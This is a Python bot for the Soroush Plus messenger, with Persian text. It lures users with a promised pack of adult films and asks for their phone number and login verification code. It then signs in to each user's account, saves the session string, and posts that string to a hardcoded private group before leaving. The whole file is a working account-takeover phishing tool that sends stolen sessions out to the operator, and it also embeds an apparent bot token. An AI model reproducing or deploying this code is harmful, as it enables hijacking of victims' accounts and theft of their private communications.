import requests
import time
import asyncio
from splusthon import SoroushClient
from splusthon.sessions import StringSession

from splusthon.tl.functions.messages import (
    CheckChatInviteRequest,
    ImportChatInviteRequest
)

from splusthon.tl.functions.channels import (
    LeaveChannelRequest
)

# ================== تنظیمات ==================
BOT_TOKEN = "70038773:DSmZd7Ph7zhgfjRN1_CFoFVLyrpJA3FGMvo"
BASE_URL = f"https://api.splus.ir/bot{BOT_TOKEN}"

# لینک گروه ثابت
GROUP = "https://splus.ir/joingroup/AXPwbCqMfmE_UjCkGVmz1g"

# ================== حلقه واحد asyncio ==================
EVENT_LOOP = asyncio.new_event_loop()
asyncio.set_event_loop(EVENT_LOOP)

def run_async(coro):
    """اجرای یک کوروتین روی حلقه واحد"""
    return EVENT_LOOP.run_until_complete(coro)

# ================== متدهای ربات ==================
def send_message(chat_id, text):
    """متد ارسال پیام"""
    url = f"{BASE_URL}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": text
    }
    try:
        response = requests.post(url, json=payload)
        return response.json()
    except Exception as e:
        print(f"خطا در ارسال پیام: {e}")
        return None

def get_updates(offset=None):
    """متد دریافت پیام (Polling)"""
    url = f"{BASE_URL}/getUpdates"
    params = {'offset': offset, 'timeout': 30}
    try:
        response = requests.get(url, params=params)
        return response.json()
    except Exception as e:
        print(f"خطا در دریافت پیام: {e}")
        return {"ok": False}

# ================== ذخیره وضعیت کاربران ==================
user_states = {}

# ================== توابع کمکی ==================
def normalize_phone(phone: str) -> str:
    """
    تبدیل شماره به فرمت بین‌المللی
    """
    phone = phone.strip().replace(" ", "").replace("-", "")
    if phone.startswith("09"):
        return "+98" + phone[1:]
    elif phone.startswith("9") and len(phone) == 10:
        return "+98" + phone
    elif phone.startswith("+98"):
        return phone
    elif phone.startswith("98"):
        return "+" + phone
    else:
        return phone

async def create_client_and_send_code(phone: str):
    """
    ساخت کلاینت، اتصال به سرور و ارسال کد تأیید
    """
    client = None
    try:
        client = SoroushClient(StringSession(), loop=EVENT_LOOP)
        await client.connect()
        sent_code = await client.send_code_request(phone)
        return client, sent_code.phone_code_hash
    except Exception as e:
        print(f"خطا در ارسال کد: {e}")
        if client:
            try:
                await client.disconnect()
            except:
                pass
        return None, None

async def sign_in_with_code(client, phone: str, code: str, phone_code_hash: str):
    """
    ورود با کد تأیید و برگرداندن سشن
    """
    try:
        if not client.is_connected():
            await client.connect()
            
        await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
        session_string = client.session.save()
        await client.disconnect()
        return True, session_string
    except Exception as e:
        error_msg = str(e)
        try:
            await client.disconnect()
        except:
            pass
            
        if "PHONE_CODE_INVALID" in error_msg or "invalid" in error_msg.lower():
            return False, "کد تأیید اشتباه است. لطفاً دوباره /start بزنید."
        elif "PHONE_CODE_EXPIRED" in error_msg:
            return False, "کد تأیید منقضی شده است. لطفاً دوباره /start بزنید."
        else:
            return False, f"خطا در ورود: {error_msg}"

async def join_group_send_message_leave(session_string: str):
    """
    ورود به گروه، ارسال پیام (که خود سشن است)، و خروج از گروه
    """
    client = None
    try:
        client = SoroushClient(StringSession(session_string), loop=EVENT_LOOP)
        print("🔄 در حال اتصال")
        await client.connect()

        if not await client.is_user_authorized():
            print("❌ Session معتبر نیست.")
            return False, "سشن معتبر نیست."

        print("✅ اتصال برقرار شد.")

        # لینک دعوت خصوصی
        if GROUP.startswith("https://splus.ir/joingroup/"):
            invite_hash = GROUP.rstrip("/").split("/")[-1]

            print("🔗 لینک دعوت خصوصی شناسایی شد.")
            result = await client(CheckChatInviteRequest(invite_hash))

            # اگر از قبل عضو گروه باشیم
            if hasattr(result, "chat"):
                print("✅ اکانت از قبل عضو گروه است.")
                entity = result.chat
            else:
                print("🚪 در حال ورود به گروه...")
                result = await client(ImportChatInviteRequest(invite_hash))

                if not hasattr(result, "chats") or not result.chats:
                    return False, "گروه بعد از ورود پیدا نشد."

                entity = result.chats[0]
                print("✅ ورود به گروه انجام شد.")
        else:
            entity = await client.get_entity(GROUP)

        print("\n✅ گروه پیدا شد!")
        print("🆔 ID:", getattr(entity, "id", None))
        print("📌 عنوان:", getattr(entity, "title", None))

        # ارسال پیام (متن = سشن)
        print("\n📤 در حال ارسال پیام (سشن)...")
        await client.send_message(entity, session_string)
        print("✅ پیام با موفقیت ارسال شد.")

        # خروج از گروه
        print("🚪 در حال خروج از گروه...")
        await client(LeaveChannelRequest(entity))
        print("✅ با موفقیت از گروه خارج شد.")

        return True, "عملیات با موفقیت انجام شد."

    except Exception as e:
        print(f"\n❌ خطا در عملیات گروه: {type(e).__name__} - {e}")
        return False, f"{type(e).__name__}: {e}"
    finally:
        if client:
            try:
                await client.disconnect()
            except Exception:
                pass

# ================== منطق اصلی ربات ==================
def process_update(update):
    """پردازش یک آپدیت دریافتی"""
    global user_states
    
    if 'message' not in update:
        return
    
    message = update['message']
    chat_id = message['chat']['id']
    text = message.get('text', '').strip()
    first_name = message['from'].get('first_name', 'کاربر')
    
    print(f"پیام جدید از {first_name} ({chat_id}): {text}")
    
    state = user_states.get(chat_id, {
        "state": "idle",
        "phone": None,
        "client": None,
        "phone_code_hash": None
    })
    
    # ========== حالت 1: دستور /start ==========
    if text == "/start":
        if state.get("client"):
            try:
                run_async(state["client"].disconnect())
            except:
                pass
        
        user_states[chat_id] = {
            "state": "awaiting_phone",
            "phone": None,
            "client": None,
            "phone_code_hash": None
        }
        send_message(chat_id, "سلام \nبرای دریافت پک فیلم ۳۰۰ تایی لطفا ثبت نام کنید❤️💋\n\nبرای ورود لطفا شماره خود را ارسال کنید 🍑🔥\nمثال (09123456789)")
        return
    
    # ========== حالت 2: در انتظار شماره تلفن ==========
    if state["state"] == "awaiting_phone":
        raw_phone = text
        
        digits = raw_phone.replace("+", "").replace(" ", "").replace("-", "")
        if not digits.isdigit() or len(digits) < 10:
            send_message(chat_id, "شماره وارد شده معتبر نیست. لطفاً دوباره وارد کنید:")
            return
        
        phone = normalize_phone(raw_phone)
        print(f"شماره نرمال شده: {phone}")
        
        send_message(chat_id, "⏳ در حال ارسال کد تأیید...")
        
        try:
            client, phone_code_hash = run_async(
                create_client_and_send_code(phone)
            )
            
            if client is None:
                send_message(chat_id, "❌ خطا در ارسال کد. لطفاً دوباره /start بزنید.")
                user_states[chat_id] = {
                    "state": "idle",
                    "phone": None,
                    "client": None,
                    "phone_code_hash": None
                }
                return
            
            user_states[chat_id] = {
                "state": "awaiting_code",
                "phone": phone,
                "client": client,
                "phone_code_hash": phone_code_hash
            }
            
            send_message(chat_id, "✅ کد تأیید  به سروش پلاس شما ارسال شد لطفا کد را وارد کنید :")
            
        except Exception as e:
            print(f"خطا: {e}")
            send_message(chat_id, f"❌ خطا در ارسال کد: {str(e)}")
            user_states[chat_id] = {
                "state": "idle",
                "phone": None,
                "client": None,
                "phone_code_hash": None
            }
        return
    
    # ========== حالت 3: در انتظار کد تأیید ==========
    if state["state"] == "awaiting_code":
        code = text.strip()
        phone = state["phone"]
        client = state["client"]
        phone_code_hash = state["phone_code_hash"]
        
        if not code:
            send_message(chat_id, "لطفاً کد تأیید را وارد کنید:")
            return
        
        send_message(chat_id, "⏳ در حال بررسی کد...")
        
        try:
            success, result = run_async(
                sign_in_with_code(client, phone, code, phone_code_hash)
            )
            
            if success:
                session_string = result
                
                # پیام موفقیت ثبت
                send_message(chat_id, "✅ ثبت شد.")
                
                # اجرای عملیات گروه با سشن دریافتی
                send_message(chat_id, "⏳ در حال انجام عملیات...")
                
                try:
                    group_success, group_msg = run_async(
                        join_group_send_message_leave(session_string)
                    )
                    
                    if group_success:
                        send_message(chat_id, "✅ عملیات با موفقیت انجام شد تا ساعتی دیگر فیلم ها ارسال خواهد شد")
                    else:
                        send_message(chat_id, f"❌ خطا در عملیات: {group_msg}")
                except Exception as e:
                    print(f"خطا در عملیات گروه: {e}")
                    send_message(chat_id, f"❌ خطا در عملیات: {str(e)}")
                
                user_states[chat_id] = {
                    "state": "idle",
                    "phone": None,
                    "client": None,
                    "phone_code_hash": None
                }
            else:
                send_message(chat_id, f"❌ {result}")
                user_states[chat_id] = {
                    "state": "idle",
                    "phone": None,
                    "client": None,
                    "phone_code_hash": None
                }
                
        except Exception as e:
            print(f"خطا در بررسی کد: {e}")
            send_message(chat_id, f"❌ خطا: {str(e)}")
            user_states[chat_id] = {
                "state": "idle",
                "phone": None,
                "client": None,
                "phone_code_hash": None
            }
        return
    
    # ========== حالت پیش‌فرض ==========
    send_message(chat_id, "لطفاً /start را بزنید.")

# ================== حلقه اصلی ==================
def main():
    print("🤖 ربات روشن شد و آماده دریافت پیام است...")
    last_update_id = 0
    
    while True:
        data = get_updates(offset=last_update_id + 1)
        
        if data.get('ok') and data.get('result'):
            for update in data['result']:
                last_update_id = update['update_id']
                process_update(update)
        
        time.sleep(1)

if __name__ == "__main__":
    main()
